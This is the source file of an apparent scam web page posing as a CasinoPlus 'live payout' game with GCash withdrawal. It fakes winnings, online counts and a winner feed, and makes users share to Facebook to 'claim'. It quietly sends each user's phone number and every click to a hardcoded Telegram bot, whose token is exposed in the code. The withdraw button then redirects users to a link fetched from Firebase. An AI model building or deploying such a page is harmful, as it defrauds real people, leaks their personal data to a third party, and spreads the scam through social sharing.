<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Live Payout</title>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="js/config.js"></script>

    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">

    <style>
        /* CSS Fixes para sa Layout */
        .game-grid { 
            display: grid; 
            grid-template-columns: repeat(3, 1fr); 
            gap: 10px; 
            margin: 20px 0; 
        }
        .card-wrapper { cursor: pointer; position: relative; display: flex; justify-content: center; }
        .card-img { width: 100%; max-width: 100px; height: auto; transition: 0.3s; }
        
        /* Share Button Style */
        .share-button {
            background: #1877f2;
            color: white;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 12px;
            font-weight: 700;
            display: none; /* Lalabas lang pag tapos na ang clicks */
            margin-top: 10px;
            cursor: pointer;
            text-transform: uppercase;
        }
        
        .card-disabled { filter: grayscale(1) opacity(0.4); pointer-events: none; }
    </style>
</head>
<body>

<div id="processingOverlay">
    <div class="spinner"></div>
    <div class="proc-title">ESTABLISHING VIALINK...</div>
    <div id="proc-status" style="color: #fbbf24; font-size: 12px;">Securing Tunnel...</div>
</div>

<div id="mainContent" style="width: 100%; display: flex; flex-direction: column; align-items: center;">

    <div class="live-stats">
        <div class="online-count"><span class="dot"></span> <span id="userCount">74</span> Members Online</div>
        <div class="live-winner-box">
            <span id="winnerEntry">User 0917***8821 claimed <img src="images/gc_icon.png" class="gc-mini-icon"> ₱500</span>
        </div>
    </div>

    <div class="card">
        <img src="images/logo1.png" class="logo-img">

        <div class="game-grid">
            <div class="card-wrapper" onclick="triggerMove(this, 'goddess', 1)">
                <img src="images/img1.png" class="card-img" id="char-1">
            </div>
            <div class="card-wrapper" onclick="triggerMove(this, 'monkey', 2)">
                <img src="images/img2.png" class="card-img" id="char-2">
            </div>
            <div class="card-wrapper" onclick="triggerMove(this, 'bathala', 3)">
                <img src="images/img3.png" class="card-img" id="char-3">
            </div>
            <div class="card-wrapper" onclick="triggerMove(this, 'bear', 4)">
                <img src="images/img4.png" class="card-img" id="char-4">
            </div>
            <div class="card-wrapper" onclick="triggerMove(this, 'dress', 5)">
                <img src="images/img5.png" class="card-img" id="char-5">
            </div>
            <div class="card-wrapper" onclick="triggerMove(this, 'boxer', 6)">
                <img src="images/img6.png" class="card-img" id="char-6">
            </div>
        </div>

        <div class="label-text">AVAILABLE BALANCE</div>
        <div class="amount" id="balanceText">₱0.00</div>

        <div class="btn-group">
            <button class="pay-button" id="claimBtn" onclick="redirectToGCash()" disabled>Withdraw via GCash</button>
            <button class="share-button" id="shareBtn" onclick="shareGame()">Share to Facebook to Claim</button>
        </div>

        <img src="images/casinoplus.jpeg" class="promo-photo">
    </div>
</div>

<script>
    // --- Configuration ---
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    
    const userPhone = localStorage.getItem("userPhone") || "Guest";
    const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    const chatId = "7298607329";

    let balance = 0;
    let clicks = 0;
    const targetReward = [550, 750, 950][Math.floor(Math.random() * 3)];

    // Telegram Logging Function
    async function logToTelegram(msg) {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
        try { fetch(url); } catch(e) {}
    }

    // Unang log
    logToTelegram(`🚀 [ViaLink] User ${userPhone} started playing.`);

    // --- Game Logic ---
    function triggerMove(el, animType, charId) {
        if (clicks >= 6 || el.classList.contains('card-disabled')) return;

        clicks++;
        const img = el.querySelector('.card-img');
        
        // Dagdag ng animation class base sa style.css mo
        const animClass = `move-${animType}`;
        img.classList.add(animClass);

        // Balance update
        let newBalance = Math.floor((clicks / 6) * targetReward);
        animateValue(balance, newBalance, 500);
        balance = newBalance;

        // Telegram log bawat click
        logToTelegram(`💰 [ViaLink] User ${userPhone} clicked Char ${charId}. Balance: ₱${balance}`);

        setTimeout(() => {
            img.classList.remove(animClass);
            el.classList.add('card-disabled');
        }, 600);

        if (clicks === 6) {
            document.getElementById('claimBtn').disabled = false;
            document.getElementById('claimBtn').innerText = "CLAIM ₱" + balance + " NOW";
            document.getElementById('shareBtn').style.display = "block"; // Labas ang Share Button
            logToTelegram(`✅ [ViaLink] User ${userPhone} is READY TO CLAIM ₱${balance}`);
        }
    }

    function animateValue(start, end, duration) {
        let startTimestamp = null;
        const step = (timestamp) => {
            if (!startTimestamp) startTimestamp = timestamp;
            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
            const currentVal = Math.floor(progress * (end - start) + start);
            document.getElementById('balanceText').innerText = "₱" + currentVal.toLocaleString() + ".00";
            if (progress < 1) window.requestAnimationFrame(step);
        };
        window.requestAnimationFrame(step);
    }

    function shareGame() {
        logToTelegram(`📢 [ViaLink] User ${userPhone} clicked SHARE.`);
        // Buksan ang FB share dialog (sample link)
        window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(window.location.href), '_blank');
    }

    function redirectToGCash() {
        document.getElementById('processingOverlay').style.display = 'flex';
        logToTelegram(`🔔 [ViaLink] User ${userPhone} is REDIRECTING to Payout.`);

        setTimeout(() => {
            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', s => {
                if(s.exists()) {
                    window.location.href = Object.values(s.val())[0].url;
                } else {
                    window.location.href = "https://www.gcash.com/";
                }
            });
        }, 3000);
    }

    // Live Stats Rotator
    setInterval(() => {
        const online = Math.floor(Math.random() * 50) + 60;
        document.getElementById('userCount').innerText = online;
    }, 5000);
</script>

</body>
</html>
